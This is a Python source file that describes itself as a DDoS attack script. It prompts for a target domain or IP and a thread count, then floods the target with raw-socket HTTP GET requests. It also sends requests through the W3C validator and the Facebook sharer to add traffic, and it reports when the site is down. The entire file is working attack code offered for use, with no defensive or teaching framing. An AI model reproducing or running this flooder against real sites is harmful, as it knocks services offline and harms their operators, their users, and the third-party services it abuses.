from queue import Queue
import time,socket,threading,urllib.request,random
import requests
from art import*
import animation
from tabulate import tabulate
from colorama import Fore, Style
status = True

def user_agent():
	global uagent
	uagent=[]
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	return(uagent)


def my_bots():
	global bots
	bots=[]
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	return(bots)


def bot_hammering(url):
	try:
		while True:
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
			time.sleep(.1)
	except:
		time.sleep(.1)


def down_it(item):
    global status
    try:
        while True:
            packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host,int(port)))
            if s.sendto( packet, (host, int(port)) ):
                s.shutdown(1)
                status = True
            else:
                s.shutdown(1)
                status = True
            time.sleep(.1)
    except socket.error as e:
        status = False
        time.sleep(.1)


def dos():
	while True:
		item = q.get()
		down_it(item)
		q.task_done()


def dos2():
	while True:
		item=w.get()
		bot_hammering(random.choice(bots)+"http://"+host)
		w.task_done()


def get_parameters():
    global host
    global port
    global thr
    r = requests.get(r'http://jsonip.com')
    PUB_ip= r.json()['ip']
    print(Fore.MAGENTA,Style.BRIGHT,end="")
    tprint(text="DDOS",font="block")
    print(Fore.GREEN,"D-DOS Attack Script Written In Python 3.9")
    print(Fore.WHITE,"Written By",end="")
    print(Fore.BLUE,"Hrishikesh Patra ",end="")
    print(Style.RESET_ALL,end="")
    aprint('pirate')
    print()
    print(Fore.RED,Style.BRIGHT+"WARNING: Your public ip "+str(PUB_ip)+" is visible")
#pirate
#happy
    while True:
        print(Fore.CYAN,Style.BRIGHT+"Enter the Domain name or Public IP\n(example google.com or 142.250.183.78):- ",end="")
        print(Style.RESET_ALL,end="")
        get_Host =str(input())
        if get_Host == "":
            print(Fore.RED,Style.BRIGHT+"No input provided")
        elif get_Host != "":
            try:
                host = (socket.gethostbyname(get_Host))
                break
            except Exception as e:
                print(Fore.RED,Style.BRIGHT,"Please Enter valid Domain name")
    port = 80 #Change Here To Change Port Number
    while True:
        print(Fore.CYAN,Style.BRIGHT,"Enter the Thread Number (Default is 135):- ",end="")
        print(Style.RESET_ALL,end="")
        get_Threat =input()
        if get_Threat == "":
            thr = 135
            break
        else:
            try:
                get_Threat = int(get_Threat)
                thr = get_Threat
                break
            except:
                print(Fore.RED,Style.BRIGHT,"Please Enter Numeric Value")
    print(Fore.BLUE,Style.BRIGHT)
    if get_Host == host:
        text ="Public IP    :- "+str(get_Host)+"\nPort Number  :- "+str(port)+"\nThreadding   :- "+str(thr)
        table = [[text]]
        output = tabulate(table, tablefmt='grid')
        print(output)
    else:
        text ="Domain Name  :- "+get_Host+"\nPublic IP    :- "+str(host)+"\nPort Number  :- "+str(port)+"\nThreadding   :- "+str(thr)
        table = [[text]]
        output = tabulate(table, tablefmt='grid')
        print(output)
    print(Style.RESET_ALL)

# reading headers
global data
data ="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-us,en;q=0.5\nAccept-Encoding: gzip,deflate\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\nKeep-Alive: 115\nConnection: keep-alive"
#task queue are q,w
q = Queue()
w = Queue()


if __name__ == '__main__':
    get_parameters()
    user_agent()
    my_bots()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host,int(port)))
        s.settimeout(1)
    except socket.error as e:
        print("check server ip and port")

    def start_main():
        while True:
            for i in range(int(thr)):
                t = threading.Thread(target=dos)
                t.daemon = True  # if thread is exist, it dies
                t.start()
                t2 = threading.Thread(target=dos2)
                t2.daemon = True  # if thread is exist, it dies
                t2.start()
            start = time.time()
            #tasking
            item = 0
            while True:
                if (item>1800): # for no memory crash
                    item=0
                    time.sleep(.1)
                item = item + 1
                q.put(item)
                w.put(item)
            q.join()
            w.join()
    new_Thread = threading.Thread(target=start_main)
    new_Thread.start()

    r_Count = 0
    @animation.wait(text="Trying To Down The Website",color='yellow',animation='elipses')
    def runAni():
        time.sleep(8)
        print(Fore.RED,Style.DIM,"Time Out Retrying...("+str(r_Count)+")")
    while True:
        if status == True:
            r_Count = r_Count + 1
            runAni()
        else:
            print(Fore.GREEN,Style.BRIGHT,"Website Down....  Until The Script Is Running")
            print(Style.RESET_ALL,end="")
            break
